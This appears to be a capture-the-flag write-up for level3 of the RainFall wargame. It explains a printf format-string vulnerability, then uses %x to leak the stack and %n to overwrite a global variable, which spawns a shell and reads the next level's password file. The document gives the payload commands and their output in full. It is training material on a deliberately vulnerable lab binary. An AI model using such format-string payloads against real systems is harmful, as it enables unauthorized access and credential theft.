### Brief
This program contain a `main` function and a `v` function.
The `main` function only call `v` and return.
The `v` function declare a stack buffer of size 520 and fill it using `fgets`.
It then uses `printf` to display the content of the buffer.
And if a global variable called `m` is equal to `0x40` it opens a new shell.

### Exploit
Here the buffer is filled using a secured function and there is no buffer overflow that we can exploit.
But our user input is passed as an argument of the `printf` function so we will use that.

The `%n` format doesn't print anything.
It takes as the corresponding argument a pointer and store inside the number of character written so far.
So we will craft a payload to format printf so that it can rewrite the `m` global variable.
We can use format strings to print what is in the stack.
We use `%x` format to print out the stack and `0xdeadbeef` to see where our input is located.

```bash
level3@RainFall:~$ python -c "print('\xef\xbe\xad\xde|' + '%x '*5)" | ./level3 
ﾭ�|200 b7fd1ac0 b7ff37d0 deadbeef 2078257c
```

Here in the output we can see:
- `ﾭ�|` is the first part of the input and correspond to: `'\xef\xbe\xad\xde|'`
- `deadbeef` is the 4th word displayed

In other words we need to put the address that we want to write to first in the input.
Then we want to pop the stack 3 time and use `%n` to store at the address the number of byte written so far.
We also need to add extra bytes so that we correctly write `0x40`.

The address of the `m` variable is retrieved using gdb.
```bash
level3@RainFall:~$ gdb level3
(gdb) info variables
...
0x0804988c  m
```

### Get access
First is the address of the variable `m`.
Then we pop the stack 3 times.
We also add 41 extra byte so that `m` will get the value `0x40`

```bash
(python -c "print('\x8c\x98\x04\x08' + '%x'*3 + 'A'*41 +  '%n')"; echo "cat /home/user/level4/.pass") | ./level3
```